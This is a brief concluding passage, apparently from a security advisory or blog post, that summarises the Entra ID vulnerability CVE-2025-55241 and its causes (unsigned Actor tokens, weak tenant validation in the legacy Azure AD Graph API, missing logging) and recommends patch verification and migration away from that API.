CVE-2025-55241 represents one of the most critical cloud identity vulnerabilities ever disclosed, with the potential to compromise the entire Entra ID ecosystem globally. The combination of unsigned Actor tokens, poor tenant validation in the legacy Graph API, and the lack of logging made this flaw exceptionally dangerous. While Microsoft patched the vulnerability in July 2025, organizations must verify patch application and actively migrate away from the legacy Azure AD Graph API to reduce exposure to similar future flaws. The vulnerability underscores the importance of strong logging, cryptographic signing of security tokens, and rigorous tenant boundary enforcement in cloud identity systems.

---
